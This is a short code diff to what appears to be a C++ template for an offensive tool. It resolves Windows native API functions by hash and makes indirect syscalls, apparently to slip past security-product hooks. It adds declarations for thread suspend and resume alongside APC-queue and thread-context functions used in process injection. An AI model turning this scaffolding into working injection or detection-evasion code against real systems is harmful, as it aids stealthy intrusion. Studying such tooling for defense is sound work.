@@ -8,6 +8,15 @@
 #include <winternl.h>
 #include "obfuscate.hpp.in"
 
+#ifndef STATUS_UNSUCCESSFUL
+#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
+#endif
+
+#ifndef _PCLIENT_ID_DEFINED
+#define _PCLIENT_ID_DEFINED
+typedef CLIENT_ID* PCLIENT_ID;
+#endif
+
 // Syscall table entry
 struct SyscallEntry {
     uint32_t hash;
@@ -277,6 +286,7 @@ static constexpr uint32_t HASH_NtQueueApcThread           = djb2_hash("NtQueueAp
 static constexpr uint32_t HASH_NtGetContextThread         = djb2_hash("NtGetContextThread");
 static constexpr uint32_t HASH_NtSetContextThread         = djb2_hash("NtSetContextThread");
 static constexpr uint32_t HASH_NtResumeThread             = djb2_hash("NtResumeThread");
+static constexpr uint32_t HASH_NtSuspendThread            = djb2_hash("NtSuspendThread");
 static constexpr uint32_t HASH_NtDelayExecution           = djb2_hash("NtDelayExecution");
 
 // Type definitions for Nt functions
@@ -288,6 +298,8 @@ using NtWaitForSingleObject_t   = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PLARGE_INTEG
 using NtQueueApcThread_t        = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, PVOID);
 using NtDelayExecution_t        = NTSTATUS(NTAPI*)(BOOLEAN, PLARGE_INTEGER);
 using NtClose_t                 = NTSTATUS(NTAPI*)(HANDLE);
+using NtResumeThread_t          = NTSTATUS(NTAPI*)(HANDLE, PULONG);
+using NtSuspendThread_t         = NTSTATUS(NTAPI*)(HANDLE, PULONG);
 
 {{#IF SYSCALL_INDIRECT}}
 // Indirect syscall: call through the clean ntdll stub address.
